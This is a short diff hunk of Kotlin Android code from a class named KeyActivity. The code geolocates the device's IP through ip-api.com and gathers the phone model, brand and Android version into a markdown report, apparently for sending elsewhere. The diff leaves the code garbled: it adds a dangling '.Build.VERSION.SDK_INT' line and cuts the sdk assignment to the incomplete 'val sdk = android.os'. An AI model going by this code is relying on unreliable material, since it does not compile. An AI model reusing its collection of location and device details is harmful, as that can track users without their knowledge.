@@ -237,16 +237,13 @@ class KeyActivity : Activity() {
                     "http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,lat,lon,query"
                 ).readText()
                 val j = org.json.JSONObject(geo)
+                .Build.VERSION.SDK_INT
                 val hora = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                     .format(java.util.Date())
                 val modelo = android.os.Build.MODEL
                 val marca = android.os.Build.BRAND
                 val android = android.os.Build.VERSION.RELEASE
-                val sdk = android.os.Build.VERSION.SDK_INT
-                val operador =
-                    (getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager)
-                        .networkOperatorName
-                val sesion = java.util.UUID.randomUUID().toString().take(8)
+                val sdk = android.os
 
                 val desc = """
                     **IP:** ${j.optString("query", ip)}
